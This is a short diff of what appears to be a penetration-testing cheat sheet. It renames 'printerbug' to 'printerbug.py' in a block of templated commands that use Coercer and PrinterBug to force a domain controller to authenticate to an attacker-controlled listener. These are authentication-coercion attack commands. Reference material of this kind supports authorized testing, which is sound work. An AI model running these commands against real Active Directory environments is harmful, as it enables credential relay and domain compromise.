@@ -29,6 +29,6 @@ the single `EfsRpcOpenFileRaw` method, which is patched on a current DC. Here
 
 ```sh
 coercer coerce -t {{rhost}} -l {{lhost}} -u {{user}} -p {{password}} -d {{domain}} --filter-method-name Efs
-printerbug {{domain}}/{{user}}:{{password}}@{{rhost}} {{lhost}}
+printerbug.py {{domain}}/{{user}}:{{password}}@{{rhost}} {{lhost}}
 coercer coerce -t {{rhost}} -l {{lhost}} -u {{user}} -p {{password}} -d {{domain}} --filter-protocol-name MS-DFSNM
 ```
